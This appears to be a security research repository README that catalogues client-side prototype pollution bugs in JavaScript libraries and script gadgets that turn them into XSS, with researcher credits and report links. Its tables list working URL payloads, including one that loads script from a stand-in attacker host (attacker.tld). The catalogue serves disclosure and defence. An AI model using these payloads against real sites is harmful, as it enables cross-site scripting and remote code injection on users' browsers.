# Client-Side Prototype Pollution

## Intro

If you are unfamiliar with Prototype Pollution Attack, you should read the following first:  
[JavaScript prototype pollution attack in NodeJS](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf) by Olivier Arteau  
[Prototype pollution – and bypassing client-side HTML sanitizers](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) by Michał Bentkowski

In this repository, I am trying to collect examples of libraries that are vulnerable to Prototype Pollution due to `document.location` parsing and useful script gadgets that can be used to demonstrate the impact.

## Prototype Pollution

| Name                                                    | Payload                                                                  | Refs                                        | Found by                                         |
|---------------------------------------------------------|--------------------------------------------------------------------------|---------------------------------------------|--------------------------------------------------|
| Wistia Embedded Video (**Fixed**)                       | `?__proto__[test]=test`<br>`?__proto__.test=test`                        | [[1]](https://hackerone.com/reports/986386) | [William Bowling](https://twitter.com/wcbowling) |
| [jQuery query-object plugin](/pp/jquery-query-object.md)| `?__proto__[test]=test`<br>`#__proto__[test]=test`                       |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
| [jQuery Sparkle](/pp/jquery-sparkle.md)                 | `?__proto__.test=test`                                                   |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
| [V4Fire Core Library](/pp/v4fire-core.md)               | `?__proto__.test=test`<br>`?__proto__[test]=test`                        |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |

## Script Gadgets

| Name                                                    | Payload                                                                  | Impact                    | Refs                                        | Found by                                            |
|---------------------------------------------------------|--------------------------------------------------------------------------|---------------------------|---------------------------------------------|-----------------------------------------------------|
| [Wistia Embedded Video](/gadgets/wistia-video.md)       | `?__proto__[innerHTML]=<img/src/onerror=alert(1)>`                       | XSS                       | [[1]](https://hackerone.com/reports/986386) | [William Bowling](https://twitter.com/wcbowling)    |
| [jQuery >= 3.0.0](/gadgets/jquery.md)                   | `?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script`          | XSS                       |                                             | [Michał Bentkowski](https://twitter.com/SecurityMB) |
| [Twitter Universal Website Tag](/gadgets/twitter-uwt.md)| `?__proto__[hif][]=javascript:alert(1)`                                  | XSS                       |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
| [Tealium Universal Tag](/gadgets/tealium-utag.md)       | `?__proto__[attrs][src]=1&__proto__[src]=//attacker.tld/js.js`           | XSS                       |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)      |
